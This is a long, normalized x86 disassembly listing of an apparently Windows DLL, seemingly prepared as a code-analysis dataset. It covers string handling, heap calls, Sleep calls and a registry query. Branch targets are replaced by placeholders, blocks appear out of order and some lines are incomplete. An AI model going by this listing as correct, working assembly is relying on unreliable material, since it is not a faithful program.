cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push esi
call sub_1005e580
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x15c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x70 ]
push esi
call sub_1005e580
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1d
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x8c ]
push esi
call sub_1005e580
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x170 ]
cmp [ ecx + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x144 ]
push ecx
lea edi [ ebp - 0x154 ]
call sub_10044960
xor ecx ecx
mov [ ebp - 0x4 ] 0x22
xor edx edx
mov [ ebp - 0x178 ] ebx
mov [ ebp - 0x160 ] ecx
mov [ ebp - 0x174 ] ebx
mov [ ebp - 0x155 ] bl
mov [ ebp - 0x15c ] edx
mov edx [ ebp - 0x17c ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_10041240
mov esi eax
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x1f
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x20
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
cmp edx ebx
je r-xdata
push 0xffffffff
push ebx
lea ecx [ edi + 0xa8 ]
push esi
call sub_1005e580
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
cmp ecx ebx
je r-xdata
push 0xdac
call [ Sleep@IAT ]
mov ecx [ ebp - 0x160 ]
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0x164 ]
mov esi [ edx + 0xec ]
mov edi [ esi ]
lea eax [ ebp - 0x174 ]
push eax
mov eax [ ebp - 0x134 ]
lea ecx [ ebp - 0x160 ]
push ecx
lea edx [ ebp - 0x178 ]
push edx
push eax
lea ecx [ ebp - 0x144 ]
call sub_1000e860
mov edx [ edi + 0x8 ]
push eax
push ebx
mov ecx esi
call edx
mov edx [ ebp - 0x15c ]
mov ecx [ ebp - 0x160 ]
inc edx
mov [ ebp - 0x15c ] edx
cmp ecx ebx
je r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_100187af
add esp 0x4
cmp eax ebx
jne r-xdata
cmp [ ecx ] bl
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov edx [ ebp - 0xf0 ]
push edx
call sub_100187af
add esp 0x4
cmp edx 0x5
jg r-xdata
cmp [ ebp - 0x178 ] 0xc8
jne r-xdata
cmp [ ebp - 0x174 ] ebx
je r-xdata
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov eax [ ebp - 0x128 ]
push eax
call sub_100187af
add esp 0x4
cmp [ ebp - 0x155 ] 0x1
jne r-xdata
mov [ ebp - 0x155 ] 0x1
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_100187af
add esp 0x4
cmp ecx ebx
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x15c ] 0x3
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
lea eax [ ebp - 0x174 ]
push eax
call sub_100199a0
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x10c ]
push eax
call sub_100187af
add esp 0x4
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_100187af
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0x43
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
mov edx [ ebp - 0x150 ]
lea ecx [ ebp - 0x148 ]
push ecx
push edx
push eax
call sub_10028f80
mov eax [ ebp - 0x154 ]
push eax
call sub_100187af
add esp 0x14
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x15c ]
mov ecx [ ebp - 0x16c ]
push ecx
mov ecx [ ebp - 0x150 ]
lea edx [ ebp - 0x148 ]
push edx
push ecx
push eax
call sub_10028f80
mov edx [ ebp - 0x154 ]
push edx
call sub_100187af
add esp 0x14
sub_10030d30
push ebp
mov ebp esp
push 0xffffffff
push sub_100886c1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
lea edi [ ecx + 0x10 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
add esi 0x24
add edi 0x24
jmp r-xdata
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp esi eax
je r-xdata
lea eax [ edi - 0x10 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edx [ edi + 0xc ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x20 ] eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] ebx
xor edx edx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
cmp [ edi + 0x4 ] 0x8
lea ebx [ edi - 0x10 ]
jae r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] edx
mov eax [ edi ]
inc eax
add eax eax
push eax
push ebx
push esi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov edx [ edi ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x4 ] 0x7
mov [ edi ] 0x0
mov [ ebx ] cx
sub_10030e20
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0xffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov dx [ ebp + 0x8 ]
push esi
mov esi 0xffff
cmp si dx
pop esi
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
add [ eax ] 0xfffffffe
mov eax 0xffff
cmp ax dx
je r-xdata
cmp dx [ eax - 0x2 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov [ eax ] dx
movzx eax dx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10030e90
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0xee
call sub_10045930
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_10072800
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
mov ecx 0x104
call sub_10017c80
test eax eax
jns r-xdata
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x5
pop edi
mov esp ebp
pop ebp
retn
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
je r-xdata
lea edx [ edi + 0x1 ]
cmp edx 0x7ffffffe
jbe r-xdata
push esi
mov eax 0x104
mov ecx ebx
call sub_10072800
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
push edx
mov ecx 0x104
call sub_10017c80
test eax eax
jns r-xdata
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
sub_10030f91
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10019247
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10031030
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
lea ebx [ ebx ]
pop edi
mov eax esi
pop esi
pop ebp
retn
inc esi
cmp esi 0x96
jl r-xdata
mov eax [ esi * 4 + rw-data ]
push eax
push edi
call sub_100385c3
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax 0x95
pop esi
pop ebp
retn
sub_1003106d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100091c8
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_10031140
push ebp
mov ebp esp
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
sub esp 0x1c
test [ ecx + esi + 0xc ] 0x6
jne r-xdata
mov eax esi
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
lea edx [ ebp - 0x1c ]
push edx
call eax
mov eax [ ebp - 0x14 ]
cdq
add eax [ ebp - 0x1c ]
adc edx [ ebp - 0x18 ]
cmp eax [ r--data ]
jne r-xdata
cmp edx [ r--data ]
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
call sub_1001bdc0
or eax 0x4
sub_100311b0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0x94
cmp [ esi + 0x14 ] 0x8
mov ebx eax
jb r-xdata
push edi
xor edi edi
mov edx 0x418f
sub esi ebx
mov esi [ esi ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
test edi edi
mov [ eax ] dx
pop edi
js r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x28 ]
cmp eax 0x13
je r-xdata
lea ecx [ edx + 0x7fffbe6f ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax 0x418f
mov ecx ebx
cmp eax 0x14
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jbe r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
js r-xdata
cmp [ ecx ] dx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax 0x418f
mov ecx ebx
cmp [ esi + 0x84 ] 0x8
jb r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
lea edx [ esi + 0x70 ]
mov edx [ esi + 0x70 ]
jmp r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
mov eax 0x418f
mov ecx ebx
mov edi edi
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
push edx
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
push eax
mov esi 0x418f
call sub_1004e6c0
mov eax [ eax ]
sub_10031319
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004d58a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_100313b6
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005bd82
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10031460
push ebp
mov ebp esp
push ecx
push esi
lea ecx [ eax + eax ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ edi ]
push eax
push 0x0
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
push 0x0
push ecx
push edx
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x2
sub_100314a0
push ebp
mov ebp esp
push ebx
mov ebx [ GetProcessHeap@IAT ]
push esi
mov esi ecx
push edi
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x3c ] edi
inc [ edi ]
call sub_1000be60
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
mov [ eax ] edi
mov edi eax
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
sub_1003159d
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10049cb7
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_100821f0
sub_100315f0
cmp [ esi + 0x68 ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x64 ] edi
mov [ esi + 0x54 ] cx
cmp [ esi + 0x4c ] 0x8
jb r-xdata
mov eax [ esi + 0x54 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esi + 0x4c ] ebx
mov [ esi + 0x48 ] edi
mov [ esi + 0x38 ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x38 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_100187af
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_10031680
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a39b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3f8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x3f0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x408 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
mov [ esp + 0x48 ] esi
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] edi
mov [ esp + 0x410 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x410 ] 0x1
